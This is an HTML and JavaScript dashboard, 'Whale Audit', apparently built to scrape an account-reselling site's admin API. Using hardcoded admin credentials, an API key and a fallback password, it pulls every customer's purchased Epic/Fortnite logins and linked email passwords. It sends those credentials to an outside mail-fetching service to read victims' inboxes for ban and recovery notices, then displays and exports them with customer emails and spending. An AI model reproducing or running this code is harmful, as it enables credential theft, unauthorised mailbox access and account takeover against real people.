<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Whale Audit v12.9 | Ultra-Speed Pro</title>
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <style>
        :root {
            --bg: #f0f2f5; 
            --card-bg: rgba(255, 255, 255, 0.95); 
            --accent: #007bff;
            --green: #28a745; 
            --red: #dc3545; 
            --border: #dee2e6; 
            --text: #1a1a1a;
            --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
        }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; line-height: 1.5; overflow-x: hidden; transition: background 0.5s ease; }
        #particles-js { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; }
        
        /* Layout */
        .header-section { max-width: 1200px; margin: 0 auto 30px auto; }
        .stats-bar { display: flex; justify-content: space-around; background: var(--card-bg); padding: 25px; border-radius: 15px; border: 1px solid var(--border); box-shadow: var(--shadow); backdrop-filter: blur(4px); }
        .stat-num { display: block; font-size: 1.6rem; font-weight: 800; color: var(--accent); }
        
        /* Progress */
        .prog-container { width: 100%; height: 10px; background: #e9ecef; border-radius: 5px; margin: 15px 0; display: none; overflow: hidden; }
        #bar { width: 0%; height: 100%; background: var(--accent); transition: width 0.1s linear; }
        
        /* Controls */
        .theme-panel { max-width: 1200px; margin: 0 auto 20px auto; background: var(--card-bg); padding: 15px; border-radius: 15px; border: 1px solid var(--border); display: flex; gap: 20px; align-items: center; backdrop-filter: blur(8px); }
        .controls { display: flex; gap: 12px; align-items: center; justify-content: center; flex-wrap: wrap; margin-bottom: 30px; background: var(--card-bg); padding: 20px; border-radius: 15px; border: 1px solid var(--border); box-shadow: var(--shadow); }
        
        /* Components */
        .btn { padding: 10px 20px; border-radius: 8px; border: 1px solid var(--border); background: #fff; cursor: pointer; font-weight: 600; transition: 0.3s; font-size: 0.9rem; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .btn-refresh { background: var(--accent); color: white !important; border: none; }
        .btn-mail { background: #6f42c1; color: white !important; border: none; }
        
        .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(450px, 1fr)); gap: 20px; }
        .account-panel { background: var(--card-bg); border: 1px solid var(--border); border-radius: 15px; padding: 20px; box-shadow: var(--shadow); backdrop-filter: blur(4px); position: relative; }
        
        /* Badges */
        .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-left: 5px; }
        .badge-mail-error { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
        .badge-revoked { background: #333; color: #ffeb3b; }
        .badge-banned { background: #ff0000; color: #fff; }

        .row { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 4px; border-bottom: 1px solid rgba(0,0,0,0.03); }
        .val { font-weight: 600; font-family: monospace; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 250px; }
        
        .mail-toggle-btn { width: 100%; background: rgba(0,0,0,0.05); padding: 10px; border: 1px solid var(--border); color: var(--accent); font-weight: bold; border-radius: 8px; cursor: pointer; margin-top:10px; }
        .mail-container { display: none; margin-top: 15px; background: #fff; padding: 10px; border-radius: 8px; border: 1px solid #ddd; max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
<div id="particles-js"></div>

<div class="theme-panel">
    <div style="font-weight:bold; font-size:0.8rem;">Accent:</div>
    <input type="color" id="accentPicker" value="#007bff" oninput="updateTheme()">
    <button class="btn" onclick="applyPreset('midnight')">Midnight</button>
    <button class="btn" onclick="applyPreset('ocean')">Ocean</button>
</div>

<div class="header-section">
    <div class="stats-bar">
        <div class="stat-item">Indexed<span id="stat-count" class="stat-num">0</span></div>
        <div class="stat-item">Banned Found<span id="stat-banned" class="stat-num" style="color:var(--red)">0</span></div>
        <div class="stat-item">Revenue<span id="stat-rev" class="stat-num">$0.00</span></div>
    </div>
    <div class="prog-container" id="progWrapper"><div id="bar"></div></div>
</div>

<div class="controls">
    <input type="text" id="search" placeholder="Search accounts..." oninput="render()" style="padding:10px; border-radius:8px; border:1px solid #ddd; width:250px;">
    <label style="font-size:0.85rem;"><input type="checkbox" id="bannedOnly" onchange="render()"> üö´ Banned</label>
    <label style="font-size:0.85rem;"><input type="checkbox" id="revokedOnly" onchange="render()"> ‚ö†Ô∏è Revoked</label>
    <label style="font-size:0.85rem;"><input type="checkbox" id="errorOnly" onchange="render()"> ‚ùå Errors</label>
    
    <button class="btn btn-refresh" onclick="masterRefresh()">üöÄ Scrape Accounts</button>
    <button class="btn btn-mail" onclick="checkAllMailboxesParallel()">‚ö° Turbo Filter (20x)</button>
    <button class="btn" onclick="exportJSON()">üì§ Export</button>
    <button class="btn" onclick="clearData()" style="color:var(--red)">üóëÔ∏è Reset</button>
</div>

<div class="container" id="mainContainer"></div>

<script>
const CONFIG = {
    AUTH_URL: "https://vjkqkrprbelmozgirnwb.supabase.co/auth/v1/token?grant_type=password",
    API_KEY: "sb_publishable_PNFkJ2efdfFkzhWiQG1_yg_qx_aOJmY",
    BASE: "https://deepsense.win/api/admin/users",
    MAIL_API: "https://rthbertg-production.up.railway.app/api/fetch-emails",
    USER: "swagcell67@gmail.com",
    PASS: "T8ertot2023!",
    FALLBACK_PW: "F0rtn1te@123",
    THREADS: 20
};

let auditData = JSON.parse(localStorage.getItem('audit_v12_storage') || "[]");
let currentJWT = "";

// --- DETECTION LOGIC ---
const REVOKE_PATTERN = /[a-zA-Z]\*+[a-zA-Z]@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;

function scanEmails(emails) {
    let result = { revoked: false, banned: false };
    if (!emails || !Array.isArray(emails)) return result;

    for (const m of emails) {
        const fullContent = ((m.text || "") + (m.html || "") + (m.subject || "")).toLowerCase();
        
        // Accurate Ban Check: Safety link presence is the primary trigger
        if (fullContent.includes("safety.epicgames.com")) {
            result.banned = true;
        }

        // Revoke Check
        if (fullContent.includes("odzyskan") || fullContent.includes("recovery") || REVOKE_PATTERN.test(fullContent)) {
            result.revoked = true;
        }
    }
    return result;
}

// --- TURBO FILTER (20 THREADS) ---
async function checkAllMailboxesParallel() {
    const status = document.getElementById('status-text');
    const bar = document.getElementById('bar');
    const wrapper = document.getElementById('progWrapper');
    wrapper.style.display = 'block';
    
    let currentIndex = 0;
    let completed = 0;

    async function worker() {
        while (currentIndex < auditData.length) {
            const i = currentIndex++;
            let item = auditData[i];
            
            try {
                // Initial Attempt
                let r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(item.email_password)}`);
                let d = await r.json();

                if(d.error) {
                    // Fallback Attempt
                    let r2 = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(item.email_login)}&password=${encodeURIComponent(CONFIG.FALLBACK_PW)}`);
                    let d2 = await r2.json();
                    if(!d2.error) {
                        item.email_password = CONFIG.FALLBACK_PW;
                        item.email_error = false;
                        const scan = scanEmails(d2.emails);
                        item.is_revoked = scan.revoked; item.is_banned = scan.banned;
                    } else { item.email_error = true; }
                } else {
                    item.email_error = false;
                    const scan = scanEmails(d.emails);
                    item.is_revoked = scan.revoked; item.is_banned = scan.banned;
                }
            } catch(e) { item.email_error = true; }
            
            completed++;
            document.getElementById('status-text').innerText = `Filtering: ${completed}/${auditData.length}`;
            bar.style.width = `${(completed / auditData.length) * 100}%`;
        }
    }

    const threads = Array(CONFIG.THREADS).fill(null).map(worker);
    await Promise.all(threads);
    saveAndRender();
    wrapper.style.display = 'none';
}

// --- SCRAPING LOGIC (20 THREADS) ---
async function masterRefresh() {
    const wrapper = document.getElementById('progWrapper');
    wrapper.style.display = 'block';
    try {
        currentJWT = await fetchNewToken();
        let allUsers = [];
        let page = 1;
        
        // Phase 1: Index Users
        while(page < 20) {
            const r = await fetch(`${CONFIG.BASE}?page=${page}&limit=100`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
            const d = await r.json();
            if(!d.users || d.users.length === 0) break;
            allUsers.push(...d.users); page++;
        }

        let results = [];
        let userIdx = 0;
        
        // Phase 2: Parallel Purchase Fetching
        async function fetchWorker() {
            while(userIdx < allUsers.length) {
                const u = allUsers[userIdx++];
                try {
                    const pr = await fetch(`${CONFIG.BASE}/${u.id}/purchases`, { headers: { 'Authorization': `Bearer ${currentJWT}` } });
                    const pd = await pr.json();
                    (pd.purchases || []).forEach(p => {
                        const acc = p.account_data || {};
                        const parts = (acc.copyFormatData?.login_data || "").split(':');
                        results.push({
                            user_id: u.id, user_email: u.email, total_spent: parseFloat(u.total_spent) || 0,
                            item_id: p.lzt_item_id, epic_login: parts[0] || 'N/A', epic_password: parts[1] || 'N/A', 
                            email_login: parts[2] || 'N/A', email_password: parts[3] || 'N/A', 
                            fn_user: acc.fortnite_username || "Unknown", skins: parseInt(acc.fortnite_skin_count) || 0,
                            email_error: false, is_revoked: false, is_banned: false
                        });
                    });
                } catch(e) {}
            }
        }
        await Promise.all(Array(CONFIG.THREADS).fill(null).map(fetchWorker));
        auditData = results;
        saveAndRender();
    } catch(err) { console.error(err); }
    wrapper.style.display = 'none';
}

// --- UI & CORE ---
function render() {
    const container = document.getElementById('mainContainer');
    const term = document.getElementById('search').value.toLowerCase();
    const bOnly = document.getElementById('bannedOnly').checked;
    const rOnly = document.getElementById('revokedOnly').checked;
    const eOnly = document.getElementById('errorOnly').checked;

    let filtered = auditData.filter(x => {
        const matchesSearch = `${x.fn_user} ${x.email_login}`.toLowerCase().includes(term);
        if (bOnly && !x.is_banned) return false;
        if (rOnly && !x.is_revoked) return false;
        if (eOnly && !x.email_error) return false;
        return matchesSearch;
    });

    document.getElementById('stat-count').innerText = filtered.length;
    document.getElementById('stat-banned').innerText = filtered.filter(x => x.is_banned).length;
    document.getElementById('stat-rev').innerText = `$${filtered.reduce((a, b) => a + b.total_spent, 0).toFixed(2)}`;
    
    container.innerHTML = filtered.map(item => `
        <div class="account-panel" style="${item.is_banned ? 'border: 2px solid red;' : ''}">
            <div style="display:flex; justify-content:space-between;">
                <h3 style="margin:0;">${item.fn_user}</h3>
                <div>
                    ${item.is_banned ? '<span class="badge badge-banned">BANNED</span>' : ''}
                    ${item.is_revoked ? '<span class="badge badge-revoked">REVOKED</span>' : ''}
                    ${item.email_error ? '<span class="badge badge-mail-error">ERROR</span>' : ''}
                </div>
            </div>
            <div style="margin-top:10px;">
                <div class="row"><span>Epic:</span><span class="val">${item.epic_login}</span></div>
                <div class="row"><span>Mail:</span><span class="val">${item.email_login}:${item.email_password}</span></div>
                <div class="row"><span>Skins:</span><span class="val">${item.skins}</span></div>
                <div class="row"><span>Customer:</span><span class="val">${item.user_email}</span></div>
            </div>
            <button class="mail-toggle-btn" onclick="toggleMailBox('${item.item_id}', '${item.email_login}', '${item.email_password}')">üì© View History</button>
            <div id="mail-zone-${item.item_id}" class="mail-container"></div>
        </div>
    `).join('');
}

async function toggleMailBox(id, email, pass) {
    const zone = document.getElementById(`mail-zone-${id}`);
    if(zone.style.display === 'block') { zone.style.display = 'none'; return; }
    zone.style.display = 'block'; zone.innerHTML = "Fetching...";
    try {
        const r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`);
        const d = await r.json();
        zone.innerHTML = (d.emails || []).map(m => `
            <div style="padding:5px; border-bottom:1px solid #eee; font-size:0.8rem; color:#333;">
                ${((m.text||"")+(m.html||"")).toLowerCase().includes("safety.epicgames.com") ? 'üö´ ' : ''}
                <b>${m.subject}</b><br>${new Date(m.date*1000).toLocaleDateString()}
            </div>
        `).join('') || "No history.";
    } catch(e) { zone.innerHTML = "Connection Error."; }
}

async function fetchNewToken() {
    const r = await fetch(CONFIG.AUTH_URL, {
        method: 'POST',
        headers: { 'apikey': CONFIG.API_KEY, 'authorization': `Bearer ${CONFIG.API_KEY}`, 'content-type': 'application/json' },
        body: JSON.stringify({ email: CONFIG.USER, password: CONFIG.PASS })
    });
    const d = await r.json(); return d.access_token;
}

function saveAndRender() { localStorage.setItem('audit_v12_storage', JSON.stringify(auditData)); render(); }
function clearData() { if(confirm("Clear local data?")) { auditData = []; saveAndRender(); } }
function exportJSON() {
    const blob = new Blob([JSON.stringify(auditData, null, 2)], { type: 'application/json' });
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `audit_pro.json`; a.click();
}
function updateTheme() { document.documentElement.style.setProperty('--accent', document.getElementById('accentPicker').value); }
function applyPreset(p) { 
    document.getElementById('accentPicker').value = p === 'midnight' ? '#e94560' : '#007bff'; 
    updateTheme(); 
}

particlesJS('particles-js', { "particles": { "number": { "value": 30 }, "opacity": { "value": 0.2 }, "move": { "enable": true, "speed": 1 } } });
window.onload = render;
</script>
</body>
</html>
